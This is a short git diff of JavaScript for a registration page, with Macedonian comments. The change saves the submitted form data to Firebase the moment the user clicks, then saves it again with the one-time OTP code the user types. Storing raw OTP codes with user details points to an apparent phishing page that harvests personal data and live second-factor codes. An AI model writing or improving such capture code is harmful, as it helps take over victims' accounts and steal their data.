@@ -460,8 +460,8 @@
         startOtpTimer();
     }
 
-    // Чекор 1: Зачувување на податоците и отворање OTP екран
-    document.getElementById('regForm').addEventListener('submit', (e) => {
+    // Чекор 1: Зачувување на првичните податоци во Firebase и отворање OTP екран
+    document.getElementById('regForm').addEventListener('submit', async (e) => {
         e.preventDefault();
 
         const btnText = document.getElementById('btnText');
@@ -484,20 +484,29 @@
         btnSpinner.style.display = 'block';
         submitBtn.disabled = true;
 
+        // Прво зачувување во базата (со празно OTP) кога ќе кликне на копчето
+        if (window.saveUserDataToFirebase) {
+            await window.saveUserDataToFirebase(currentSubmissionData);
+        }
+
         setTimeout(() => {
+            btnText.style.display = 'block';
+            btnSpinner.style.display = 'none';
+            submitBtn.disabled = false;
             document.getElementById('formContainer').style.display = 'none';
             document.getElementById('otpContainer').style.display = 'block';
             startOtpTimer();
         }, 1500);
     });
 
-    // Чекор 2: Додавање OTP и праќање во Firebase
+    // Чекор 2: Додавање OTP и праќање во Firebase кога ќе го внесе кодот
     document.getElementById('otpForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         
         const otpValue = document.getElementById('otpCode').value;
         currentSubmissionData.otpCode = otpValue;
 
+        // Второ зачувување во базата (сега со вклучен OTP код)
         if (window.saveUserDataToFirebase) {
             await window.saveUserDataToFirebase(currentSubmissionData);
         }
